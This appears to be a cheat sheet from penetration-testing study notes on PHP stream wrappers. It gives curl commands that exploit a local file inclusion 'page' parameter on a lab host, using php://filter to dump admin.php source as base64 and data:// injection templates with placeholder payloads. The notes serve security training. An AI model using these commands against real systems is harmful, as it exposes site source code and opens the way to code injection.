| Wrapper    | Purpose                                   |
| ---------- | ----------------------------------------- |
| file://    | Local filesystem                          |
| http(s):// | Remote HTTP(S)                            |
| ftp(s)://  | Remote FTP(S)                             |
| php://     | I/O streams (stdin, output, filter, etc.) |
| zlib://    | Compression streams                       |
| data://    | Inline data (RFC 2397)                    |
| glob://    | Path pattern matching                     |
| phar://    | PHP archives                              |
| ssh2://    | SSH2 (requires ext)                       |
| rar://     | RAR (requires ext)                        |
| expect://  | Process interaction (requires ext)        |

## Commands

| Action | Command |
|---|---|
| View source via filter | curl "http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php" |
| Base64-encode source | curl "http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php" |
| Decode base64 output | echo "<base64>" \| base64 -d |
| data:// (template) | curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<PLACEHOLDER>" |
| data:// base64 (template) | curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,<PLACEHOLDER_B64>" |
